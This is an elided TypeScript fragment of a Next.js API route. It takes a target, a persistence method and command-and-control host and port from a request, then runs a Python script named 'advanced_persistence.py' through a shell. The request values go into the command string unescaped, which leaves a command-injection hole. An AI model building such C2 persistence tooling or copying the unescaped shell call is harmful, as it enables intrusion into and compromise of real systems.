...
export async function POST(request: NextRequest) {
  try {
    ...
    const { target, method = 'systemd', c2Host = '127.0.0.1', c2Port = 4444 } = body;
    ...
    try {
      ...
      if (pythonCheck.stdout) {
        try {
          const scriptPath = process.cwd() + '/scripts/advanced_persistence.py';
          const { stdout, stderr } = await execPromise(
            `python3 ${scriptPath} "${target}" "${method}" "${c2Host}" "${c2Port}"`,
            { timeout: 30000 }
          );
